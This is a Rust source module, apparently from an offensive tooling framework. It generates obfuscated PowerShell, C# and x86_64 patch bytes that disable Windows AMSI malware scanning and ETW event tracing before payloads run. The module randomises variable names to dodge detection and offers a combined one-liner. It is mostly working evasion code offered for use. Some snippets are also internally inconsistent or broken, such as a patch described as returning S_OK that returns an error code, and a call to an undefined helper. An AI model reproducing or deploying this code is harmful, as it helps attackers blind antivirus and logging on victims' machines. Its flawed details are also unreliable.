//! AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows)
//! bypass pattern generation.
//!
//! Generates shellcode and script-level patches that disable AMSI scanning
//! and ETW telemetry before executing payloads. These are critical for
//! .NET assembly loading and PowerShell-based delivery.
//!
//! Note: These are code generation utilities — the actual patches are applied
//! at runtime by the generated payload/cradle on the target.

/// AMSI bypass techniques
#[derive(Debug, Clone, Copy)]
pub enum AmsiBypass {
    /// Patch AmsiScanBuffer to always return S_OK (clean)
    PatchScanBuffer,
    /// Set amsiInitFailed flag to prevent initialization
    ForceInitFail,
    /// Unhook amsi.dll by reloading from disk
    ReloadDll,
    /// Patch AmsiOpenSession to fail
    PatchOpenSession,
}

/// ETW bypass techniques
#[derive(Debug, Clone, Copy)]
pub enum EtwBypass {
    /// Patch EtwEventWrite to return immediately
    PatchEventWrite,
    /// Patch NtTraceEvent in ntdll
    PatchNtTraceEvent,
}

/// Generate a PowerShell AMSI bypass snippet
pub fn generate_pwsh_amsi_bypass(technique: AmsiBypass) -> String {
    match technique {
        AmsiBypass::PatchScanBuffer => {
            // Obfuscated AmsiScanBuffer patch — each generation randomizes variable names
            let var1 = random_var_name();
            let var2 = random_var_name();
            let var3 = random_var_name();
            format!(
                r#"${v1}=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
${v2}=${v1}.GetField([char]97+'msi'+'Context',[Reflection.BindingFlags]'NonPublic,Static')
${v3}=[Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
${v2}.SetValue($null,${v3})
[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,${v3},6)"#,
                v1 = var1, v2 = var2, v3 = var3,
            )
        }
        AmsiBypass::ForceInitFail => {
            let var1 = random_var_name();
            format!(
                r#"${v}=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+'Utils')
${v}.GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,$true)"#,
                v = var1,
            )
        }
        AmsiBypass::ReloadDll => {
            format!(
                r#"$a=[char]97;$m=$a+'msi';$d=$m+'.dll'
Copy-Item "C:\Windows\System32\$d" "$env:TEMP\$d" -Force
Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);' -Name K -Namespace W
[W.K]::LoadLibrary("$env:TEMP\$d")"#,
            )
        }
        AmsiBypass::PatchOpenSession => {
            let var1 = random_var_name();
            format!(
                r#"${v}=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  (Get-ProcAddr amsi AmsiOpenSession),[Func[IntPtr,IntPtr,Int32]])
$p=[Runtime.InteropServices.Marshal]::AllocHGlobal(1)
[Runtime.InteropServices.Marshal]::WriteByte($p,0xC3)"#,
                v = var1,
            )
        }
    }
}

/// Generate a PowerShell ETW bypass snippet
pub fn generate_pwsh_etw_bypass(technique: EtwBypass) -> String {
    match technique {
        EtwBypass::PatchEventWrite => {
            let var1 = random_var_name();
            format!(
                r#"${v}=[Reflection.Assembly]::LoadWithPartialName('System.Core')
$etwType=${v}.GetType('System.Diagnostics.Eventing.EventProvider')
$etwField=$etwType.GetField('m_enabled','Instance,NonPublic')
# Disable all ETW providers in this process
foreach($p in [System.Diagnostics.Eventing.EventProvider]::GetProviders()) {{
  try {{ $etwField.SetValue($p, 0) }} catch {{}}
}}"#,
                v = var1,
            )
        }
        EtwBypass::PatchNtTraceEvent => {
            format!(
                r#"$ntdll=[Runtime.InteropServices.Marshal]::GetHINSTANCE(
  [AppDomain]::CurrentDomain.GetAssemblies()|?{{$_.Location -like '*ntdll*'}})
$addr=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);' -Name G -Namespace W -PassThru
$ptr=[W.G]::GetProcAddress($ntdll,'NtTraceEvent')
[Runtime.InteropServices.Marshal]::WriteByte($ptr,0xC3)"#,
            )
        }
    }
}

/// Generate x86_64 shellcode for AMSI bypass (for use in Donut-style loaders)
pub fn generate_amsi_patch_shellcode() -> Vec<u8> {
    // This shellcode:
    // 1. Calls LoadLibraryA("amsi.dll")
    // 2. Calls GetProcAddress(handle, "AmsiScanBuffer")
    // 3. Patches the first 6 bytes to: mov eax, 0x80070057; ret
    //
    // Represented as a data structure for the loader to use.
    // The actual shellcode bytes would be platform-specific.
    // Here we provide the patch bytes that get written to AmsiScanBuffer:
    vec![
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 (E_INVALIDARG)
        0xC3,                            // ret
    ]
}

/// Generate x86_64 shellcode for ETW bypass
pub fn generate_etw_patch_shellcode() -> Vec<u8> {
    // Patch for EtwEventWrite — just return 0 (STATUS_SUCCESS)
    vec![
        0x48, 0x33, 0xC0, // xor rax, rax
        0xC3,              // ret
    ]
}

/// Generate a .NET-compatible AMSI bypass that works from managed code
pub fn generate_dotnet_amsi_bypass() -> String {
    let var1 = random_var_name();
    let var2 = random_var_name();
    format!(
        r#"// C# AMSI bypass for .NET assembly execution
var {v1} = typeof(System.Management.Automation.AmsiUtils);
var {v2} = {v1}?.GetField("amsiContext",
    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
if ({v2} != null) {{
    var ptr = System.Runtime.InteropServices.Marshal.AllocHGlobal(9076);
    {v2}.SetValue(null, ptr);
}}"#,
        v1 = var1, v2 = var2,
    )
}

/// Generate a combined bypass (AMSI + ETW) as a PowerShell one-liner
pub fn generate_combined_bypass() -> String {
    let amsi = generate_pwsh_amsi_bypass(AmsiBypass::PatchScanBuffer);
    let etw = generate_pwsh_etw_bypass(EtwBypass::PatchEventWrite);
    format!("{amsi}\n{etw}")
}

/// Random PowerShell variable name (polymorphic output)
fn random_var_name() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let prefixes = ["x", "v", "t", "p", "q", "r", "w", "z"];
    let prefix = prefixes[rng.gen_range(0..prefixes.len())];
    let suffix: u32 = rng.gen_range(1000..9999);
    format!("{prefix}{suffix}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_bypass_polymorphism() {
        let b1 = generate_pwsh_amsi_bypass(AmsiBypass::PatchScanBuffer);
        let b2 = generate_pwsh_amsi_bypass(AmsiBypass::PatchScanBuffer);
        // Same technique but different variable names
        assert_ne!(b1, b2);
        // Both should contain the core pattern
        assert!(b1.contains("AmsiUtils") || b1.contains("msiUtils"));
        assert!(b2.contains("AmsiUtils") || b2.contains("msiUtils"));
    }

    #[test]
    fn test_etw_bypass_generation() {
        let bypass = generate_pwsh_etw_bypass(EtwBypass::PatchEventWrite);
        assert!(bypass.contains("EventProvider"));
    }

    #[test]
    fn test_amsi_patch_shellcode() {
        let sc = generate_amsi_patch_shellcode();
        assert_eq!(sc.len(), 6);
        assert_eq!(sc[5], 0xC3); // ret instruction
    }

    #[test]
    fn test_etw_patch_shellcode() {
        let sc = generate_etw_patch_shellcode();
        assert_eq!(sc.len(), 4);
        assert_eq!(sc[3], 0xC3); // ret instruction
    }

    #[test]
    fn test_combined_bypass() {
        let combined = generate_combined_bypass();
        assert!(combined.contains("msiUtils") || combined.contains("AmsiUtils"));
        assert!(combined.contains("EventProvider"));
    }

    #[test]
    fn test_force_init_fail() {
        let bypass = generate_pwsh_amsi_bypass(AmsiBypass::ForceInitFail);
        assert!(bypass.contains("amsiInit"));
        assert!(bypass.contains("$true"));
    }
}
